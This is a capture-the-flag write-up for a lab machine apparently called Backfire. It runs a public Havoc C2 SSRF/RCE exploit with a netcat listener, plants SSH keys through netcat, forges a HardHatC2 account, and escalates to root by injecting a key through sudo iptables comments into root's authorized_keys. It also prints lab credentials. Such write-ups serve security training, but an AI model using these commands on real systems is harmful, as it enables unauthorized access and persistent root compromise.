<h1>BACKFIRE WRITE UP</h1>

{backfire.png}<br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Medium<br>
<b>Operating System:</b> Linux<br>
<b>IP Address:</b> 10.10.11.49<br>
<b>Hostname:</b> backfire.htb<br>
<b>Open Ports:</b> 22/tcp, 443/tcp, 8000/tcp, 5000/tcp<br>
<b>Web Server:</b> nginx 1.22.1<br>
<b>Addition:</b> Havoc, HardHatC2<br>

<h2>SUMMARY</h2>

Backfire is a medium-difficulty box that starts with an exposed Havoc command and control server, where I exploit Server Side Request Forgery to ultimately establish a communication stream to Havoc's WebSocket API and inject malicious commands to get remote code execution in Havoc payload compile process. Once I gain the initial foothold, another C&C is running locally named Hardhat. The Hardhat C&C is open source, so I craft a JWT token with the default hardcoded JWT secret key. The user account can execute iptables & iptables-save for privilege escalation, allowing the attacker to achieve arbitrary file write.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan.

<code>nmap -sC -sV 10.10.11.49</code>

Result:

{ss1.png}<br>

As I can see ports 22(SSH), 443(HTTPS), 8000(HTTP) and 5000(UPNP) are open.

<b>2-</b> Visit "http://10.10.11.49:8000"

{ss2.png}<br>

On this page I find two files. I immidiately think these files are about some sort of configuration.

<b>3-</b> First read "disable_tls.patch" file. For that

<code>vim disable_tls.patch</code>

For an easy understanding i prefer vim here.

Result:

{ss3.png}<br>

In my understanding this is a configration about disabling tls like it's mentioned also in the file name. It means port 443 won't show me any page or result.

<b>4-</b> Now I read "havoc.yaotl" file. For that

<code>vim havoc.yaotl</code>

Result:

{ss4.png}<br>

This file gives me lots of information. First I see that this is a configration file for <a href="https://github.com/HavocFramework/Havoc">Havoc</a> server, I also see the host name is "backfire.htb", teamserver host/port information and find some credentials about this Havoc server.

First username=ilya	password=CobaltStr1keSuckz!
Second username=sergej	password=1w4nt2sw1tch2h4rdh4tc2

<b>5-</b> I add "backfire.htb" host name to my "/etc/hosts" file.

<code>echo "10.10.11.49	backfire.htb" | sudo tee -a /etc/hosts</code>

<b>6-</b> I start searching about Havoc and Havoc related vulnerabilities. I find this <a href="https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE">github page</a>.

<code>git clone https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE</code>

<b>7-</b> In this github file, main exploitation script is run by python. So I start a virtual environment for this.

<code>python3 -m venv myenv && source myenv/bin/activate</code>

After that I install all requirements from "requirements.txt".

<code>pip install -r requirements.txt</code>

<b>8-</b> From now on I'm ready to go do some changes in "exploit.py" and "payload.sh". For that in "exploit.py"

{ss5.png}<br>

and end of the code

{ss6.png}<br>

In payload.sh

{ss7.png}<br>

<b>9-</b> After all this changes I start to "exploit.py" according to github page instructions. For that I first start listening with netcat.

<code>nc -lvnp 9090</code>

After that start http server.

<code>python3 -m http.server 8000</code>

And lastly start "exploit.py" like this "exploit.py -t https://[TARGET MACHINE IP] -i [HAVOC.YOATL TEAMSERVER HOST] -p [HAVOC.YOATL TEAMSERVER PORT]".

<code>python3 exploit.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056</code>

Result:

{ss8.png}<br>

This is how I get access to the shell!!

<b>11-</b> I need to go "/home/ilya" for "user.txt".

<code>cd /home/ilya && ls</code>

Result:

{ss9.png}<br>

As you can see, this is how I get user flag!!

<b>12-</b> Now I got some problem about my shell connection. Connection automaticaly timeout aproxemitly 30-45 seconds later after connection starts.

<b>13-</b> For a stable connection first I check "~/.ssh" directory access. And I can access as "ilya" user. So from now on I can use a key for stable ssh connection.

First I create a key on my system:

<code>ssh-keygen -t rsa -C "fnwn@htb.ctf"</code>

Result:

{ss10.png}<br>

<b>14-</b> Now I need to add this "id_rsa.pub" key value to target machine's "authorized_keys" file. For that I use netcat.

On my system:

<code>nc 10.10.11.49 9900 < ~/.ssh/id_rsa.pub</code>

10.10.11.49 is target machine IP address and port 9900 is my choice for this connection.

On target system:

<code>nc -lvnp 9900 >> ~/.ssh/authorized_keys</code>

Result:

{ss11.png}<br>

Now I got stable ssh connection as "ilya" user without password.

<b>15-</b> I look at files and find "hardhat.txt".

<code>ls</code>

Result:

{ss12.png}<br>

<b>16-</b> When I read the file I get some information about HardHatC2 server usage.

<code>cat hardhat.txt</code>

Result:

{ss13.png}<br>

From this note I can understand there is <a href="https://github.com/DragoQCC/CrucibleC2">HardHatC2</a> server running with default settings.

<b>17-</b> After my research I find this write up about HardHatC2 vulnerability <a href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7">here</a>.

<b>18-</b> I check netstat results for port conditions.

<code>netstat -tuln</code>

Result:

{ss14.png}<br>

And as I see there is ports 5000 and 7096 are in a listening state.

<b>19-</b> For connection to HardHatC2 server via local environment

<code>ssh -L 7096:localhost:7096 -L 5000:localhost:5000 ilya@backfire.htb</code>

Result:

{ss15.png}<br>

And I can review HardHatC2 web interface on my browser as "https://localhost:7096".

<b>20-</b> In the write up there is a python script. In this script made some changes about username and password. For that

<code>vim script.py</code>

Result:

{ss16.png}<br>

As you can see I change username and password value to my own.

<b>21-</b> After that, run the script.

<code>python3 script.py</code>

Result:

{ss17.png}<br>

And now I create my account with "fnwn" username and password. So from now on I can login HardHatC2 system.

<b>22-</b> Now I go to "/ImplantInteract" page and add terminal here. In terminal I can use os commands like a normal terminal.

{ss18.png}<br>

As you can see I am user as "sergej" in target system.

<b>23-</b> I need a stable connection like before. For that I use the same way as before

On my system:

<code>nc 10.10.11.49 9900 < ~/.ssh/id_rsa.pub</code>

On target system:

<code>nc -lvnp 9900 >> ~/.ssh/authorized_keys</code>

Result:

{ss19.png}<br>

<b>24-</b> From now on I can establish ssh connection as user "sergej" without password.

{ss20.png}<br>

<b>25-</b> Start gathering information about sergej(Permissions etc.). For that

<code>id</code>

<code>sudo -l</code>

Result:

{ss21.png}<br>

<b>26-</b> I can see "sergej" got root permissions on "iptables" and "iptables-save" commands. So I start my research about these commands and find this write up <a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">here</a>.

<b>27-</b> In this write up author creates a root user on the test system. I'm not gonna do that. My target is a community machine so I don't wanna break something and give other users a hard time. So for that instead of creating a new user, I create a ssh key and send this key root's authorized_keys file. For that

On my system:

<code>ssh-keygen -t ed25519 -C "fnwn@htb.ctf"</code>

I create a new key for this because "--comment" flag has a limit of 256 characters.

On target system:

<code>sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAaf27MOr6ydoHAvR8qgW8rwbuiZ4tVkxe7tAcF8ZJP fnwn@htb.ctf\n'</code>

With this command I add my id_ed25519.pub key value to input stream.

<code>sudo iptables -S</code>

I can see this is working.

<code>sudo iptables-save -f /root/.ssh/authorized_keys</code>

And finally I write my key value in to the root "authorized_keys" file.

Result:

{ss22.png}<br>

<b>28-</b> I start new ssh connection as "root" user without password.

<code>ssh root@backfire.htb</code>

Result:

{ss23.png}<br>

And there it is how I get the root flag!!

<h2>RESOURCE</h2>
<ul>
<li><a href="https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE">CVE-2024-41570 HAVOC C2 RCE</a></li>
<li><a href="https://github.com/DragoQCC/CrucibleC2">HARDHATC2</a></li>
<li><a href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7">HARDHATC2 0-DAYS WRITE UP</a></li>
<li><a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">SUDO IPTABLES PRIVESC</a></li>
</ul>
